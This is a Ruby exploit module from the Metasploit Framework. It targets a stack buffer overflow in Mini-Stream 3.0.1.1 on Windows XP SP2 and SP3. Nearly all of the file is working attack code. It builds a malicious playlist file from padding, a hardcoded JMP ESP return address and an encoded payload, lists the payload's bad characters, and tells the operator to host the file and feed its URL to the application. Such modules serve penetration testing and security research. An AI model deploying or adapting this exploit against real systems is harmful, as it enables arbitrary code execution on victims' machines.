##
# $Id: mini_stream.rb 11516 2011-01-08 01:13:26Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = NormalRanking

	include Msf::Exploit::FILEFORMAT

	def initialize(info = {})
		super(update_info(info,
			'Name' => 'Mini-Stream 3.0.1.1 Buffer Overflow Exploit',
			'Description' => %q{
					This module exploits a stack buffer overflow in Mini-Stream 3.0.1.1
				By creating a specially crafted pls file, an an attacker may be able
				to execute arbitrary code.
			},
			'License' => MSF_LICENSE,
			'Author' =>
				[
					'CORELAN Security Team ',
					'Ron Henry <rlh[at] ciphermonk.net>', # Return address update
					'dijital1',
				],
			'Version' => '$Revision: 11516 $',
			'References' =>
				[
					[ 'OSVDB', '61341' ],
					[ 'URL', 'http://www.exploit-db.com/exploits/10745' ],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'thread',
					'DisablePayloadHandler' => 'true',
				},
			'Payload' =>
				{
					'Space' => 3500,
					'BadChars' => "\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c\x26\x3d\x2b\x3f\x3a\x3b\x2d\x2c\x2f\x23\x2e\x5c\x30",
					'StackAdjustment' => -3500,
				},
			'Platform' => 'win',
			'Targets' =>
				[
					[ 'Windows XP SP3 - English', { 'Ret' => 0x7e429353} ], 		# 0x7e429353 JMP ESP - USER32.dll
					[ 'Windows XP SP2 - English', { 'Ret' => 0x7c941eed} ], 		# 0x7c941eed JMP ESP - SHELL32.dll
				],
			'Privileged' => false,
			'DisclosureDate' => 'Dec 25 2009',
			'DefaultTarget' => 0))

		register_options(
			[
				OptString.new('FILENAME', [ false, 'The file name.', 'metasploit.pls']),
			], self.class)
	end


	def exploit
		sploit = rand_text_alphanumeric(17403)
		sploit << [target.ret].pack('V')
		sploit << "CAFE" * 8
		sploit << payload.encoded

		print_status("Creating '#{datastore['FILENAME']}' file ...")
		file_create(sploit)
		print_status("Copy '#{datastore['FILENAME']}' to a web server and pass the URL to the application")
	end

end

